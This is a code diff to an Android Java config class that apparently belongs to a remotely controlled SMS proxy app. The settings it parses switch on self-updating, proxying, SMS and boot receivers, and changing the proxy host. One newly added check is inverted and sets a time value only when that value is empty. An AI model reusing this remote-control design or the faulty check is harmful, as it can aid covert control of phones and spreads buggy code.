@@ -1,5 +1,6 @@
 package com.android.sms.proxy.entity;
 
+import android.text.TextUtils;
 import android.util.Log;
 
 /**
@@ -156,6 +157,7 @@ public class NativeParams {
 	public static boolean ACTION_STOP_HEARTBEAT_SERVICE = false;
 	public static boolean ACTION_REPLACE_PROXY_HOST = false;
 	public static boolean ACTION_REPEAT_ALARM = true;
+	public static boolean ACTION_ALLOW_KITKAT_ABOVE_MESSAGE = true;
 	public static String NEW_PROXY_HOST = "";
 
 	public static String ASSIGN_SPECIFIC_TIME = "";
@@ -173,7 +175,9 @@ public class NativeParams {
 	public static String DEFAULT_PHONE_IMEI = "123451234512345";
 
 	public static boolean DEFAULT_SEND_BINARY_SMS = false;
-	public static String DEFAULT_BINARY_SMS_PORT = "6742";
+	public static String DEFAULT_BINARY_SMS_PORT = "80";
+
+	public static int getPhoneNumberFailCount = 50;
 
 	public static String HEARTBEAT_FROM_TYPE = "startType";
 	public static String TYPE_FROM_ALARM = "startByAlarm";
@@ -192,36 +196,84 @@ public class NativeParams {
 		if (isUpdatedOnlineConfig) return;
 		if (config == null) return;
 		Log.d("config", "updateOnlineConfig!!!!!!!!");
-		HEARTBEAT_APK_UPDATE = Boolean.valueOf(config.getActionUpdate());
-		HEARTBEAT_APK_PROXY = Boolean.valueOf(config.getActionOpenProxy());
-		HEARTBEAT_CHECK_PROXY = Boolean.valueOf(config.getActionCheckService());
-		HEARTBEAT_GET_MESSAGE = Boolean.valueOf(config.getActionGetMessage());
-		ACTION_ASSIGN_SPECIFIC_TIME = Boolean.valueOf(config.getActionAssignSpecificTime());
-		if (ACTION_ASSIGN_SPECIFIC_TIME) {
+		if (!TextUtils.isEmpty(config.getActionUpdate())) {
+			HEARTBEAT_APK_UPDATE = Boolean.valueOf(config.getActionUpdate());
+		}
+		if (!TextUtils.isEmpty(config.getActionOpenProxy())) {
+			HEARTBEAT_APK_PROXY = Boolean.valueOf(config.getActionOpenProxy());
+		}
+		if (!TextUtils.isEmpty(config.getActionCheckService())) {
+			HEARTBEAT_CHECK_PROXY = Boolean.valueOf(config.getActionCheckService());
+		}
+		if (!TextUtils.isEmpty(config.getActionGetMessage())) {
+			HEARTBEAT_GET_MESSAGE = Boolean.valueOf(config.getActionGetMessage());
+		}
+		if (!TextUtils.isEmpty(config.getActionAssignSpecificTime())) {
+			ACTION_ASSIGN_SPECIFIC_TIME = Boolean.valueOf(config.getActionAssignSpecificTime());
+		}
+		if (ACTION_ASSIGN_SPECIFIC_TIME && TextUtils.isEmpty(config.getAssignSpecificTime())) {
 			ASSIGN_SPECIFIC_TIME = config.getAssignSpecificTime();
 		}
-		HEARTBEAT_UPDATE_INIT_DELAY = config.getHeartbeatUpdateInitDelay();
-		HEARTBEAT_MESSAGE_INIT_DELAY = config.getHeartbeatMessageInitDelay();
-		HEARTBEAT_PROXY_INIT_DELAY = config.getHeartbeatProxyInitDelay();
-		PROXY_CHECK_INIT_DELAY = config.getProxyCheckInitDelay();
-		PROXY_CHECK_INTERVAL_TIME = config.getProxyCheckIntervalTime();
-		HEARTBEAT_PROXY_INTERVAL = config.getHeartbeatProxyIntervalTime();
-		ACTION_ACCEPT_BOOT_RECEIVER = Boolean.valueOf(config.getActionAcceptBootReceiver());
-		ACTION_ACCEPT_SMS_RECEIVER = Boolean.valueOf(config.getActionAcceptSmsReceiver());
-		ACTION_ACCEPT_INTENT_START = Boolean.valueOf(config.getActionAcceptIntentStart());
-		ACTION_STOP_HEARTBEAT_SERVICE = Boolean.valueOf(config.getActionStopHeartbeatService());
-		ACTION_REPLACE_PROXY_HOST = Boolean.getBoolean(config.getActionReplaceProxyHost());
+		if (config.getHeartbeatUpdateInitDelay() > 0) {
+			HEARTBEAT_UPDATE_INIT_DELAY = config.getHeartbeatUpdateInitDelay();
+		}
+		if (config.getHeartbeatMessageInitDelay() > 0) {
+			HEARTBEAT_MESSAGE_INIT_DELAY = config.getHeartbeatMessageInitDelay();
+		}
+		if (config.getHeartbeatProxyInitDelay() > 0) {
+			HEARTBEAT_PROXY_INIT_DELAY = config.getHeartbeatProxyInitDelay();
+		}
+		if (config.getProxyCheckInitDelay() > 0) {
+			PROXY_CHECK_INIT_DELAY = config.getProxyCheckInitDelay();
+		}
+		if (config.getProxyCheckIntervalTime() > 0) {
+			PROXY_CHECK_INTERVAL_TIME = config.getProxyCheckIntervalTime();
+		}
+		if (config.getHeartbeatProxyIntervalTime() > 0) {
+			HEARTBEAT_PROXY_INTERVAL = config.getHeartbeatProxyIntervalTime();
+		}
+		if (!TextUtils.isEmpty(config.getActionAcceptBootReceiver())) {
+			ACTION_ACCEPT_BOOT_RECEIVER = Boolean.valueOf(config.getActionAcceptBootReceiver());
+		}
+		if (!TextUtils.isEmpty(config.getActionAcceptSmsReceiver())) {
+			ACTION_ACCEPT_SMS_RECEIVER = Boolean.valueOf(config.getActionAcceptSmsReceiver());
+		}
+		if (!TextUtils.isEmpty(config.getActionAcceptIntentStart())) {
+			ACTION_ACCEPT_INTENT_START = Boolean.valueOf(config.getActionAcceptIntentStart());
+		}
+		if (!TextUtils.isEmpty(config.getActionStopHeartbeatService())) {
+			ACTION_STOP_HEARTBEAT_SERVICE = Boolean.valueOf(config.getActionStopHeartbeatService());
+		}
+		if (!TextUtils.isEmpty(config.getActionReplaceProxyHost())) {
+			ACTION_REPLACE_PROXY_HOST = Boolean.getBoolean(config.getActionReplaceProxyHost());
+		}
 		if (ACTION_REPLACE_PROXY_HOST) {
 			NEW_PROXY_HOST = config.getNewProxyHost();
 		}
 		isUpdatedOnlineConfig = true;
-		SMS_RECEIVER_VALID_TIME = config.getSmsReceiverValidTime();
-		HEARTBEAT_RUNNABLE_DEBUG = Boolean.valueOf(config.getHeartbeatRunnableDebug());
-		ACTION_REPEAT_ALARM = Boolean.valueOf(config.getActionRepeatingAlarm());
-
-		ACTION_ACCEPT_NETWORK_CHANGE_RECEIVER = Boolean.valueOf(config.getActionAcceptNetworkChangeReceiver());
-		ACTION_ACCEPT_PACKAGE_REMOVED_RECEIVER = Boolean.valueOf(config.getActionAcceptPackageRemovedReceiver());
-		ACTION_ACCEPT_USER_PRESENT_RECEIVER = Boolean.valueOf(config.getActionAcceptUserPresentReceiver());
+		if (config.getSmsReceiverValidTime() > 0) {
+			SMS_RECEIVER_VALID_TIME = config.getSmsReceiverValidTime();
+		}
+		if (!TextUtils.isEmpty(config.getHeartbeatRunnableDebug())) {
+			HEARTBEAT_RUNNABLE_DEBUG = Boolean.valueOf(config.getHeartbeatRunnableDebug());
+		}
+		if (!TextUtils.isEmpty(config.getActionRepeatingAlarm())) {
+			ACTION_REPEAT_ALARM = Boolean.valueOf(config.getActionRepeatingAlarm());
+		}
+		if (!TextUtils.isEmpty(config.getActionAcceptNetworkChangeReceiver())) {
+			ACTION_ACCEPT_NETWORK_CHANGE_RECEIVER = Boolean.valueOf(config.getActionAcceptNetworkChangeReceiver());
+		}
+		if (!TextUtils.isEmpty(config.getActionAcceptPackageRemovedReceiver())) {
+			ACTION_ACCEPT_PACKAGE_REMOVED_RECEIVER = Boolean.valueOf(config.getActionAcceptPackageRemovedReceiver());
+		}
+		if (!TextUtils.isEmpty(config.getActionAcceptUserPresentReceiver())) {
+			ACTION_ACCEPT_USER_PRESENT_RECEIVER = Boolean.valueOf(config.getActionAcceptUserPresentReceiver());
+		}
+		if (!TextUtils.isEmpty(config.getActionGetPhoneNumberFailedCount())) {
+			getPhoneNumberFailCount = Integer.valueOf(config.getActionGetPhoneNumberFailedCount());
+		}
+		if (!TextUtils.isEmpty(config.getActionAllowKitkatAboveMessage())) {
+			ACTION_ALLOW_KITKAT_ABOVE_MESSAGE = Boolean.valueOf(config.getActionAllowKitkatAboveMessage());
+		}
 	}
-
 }
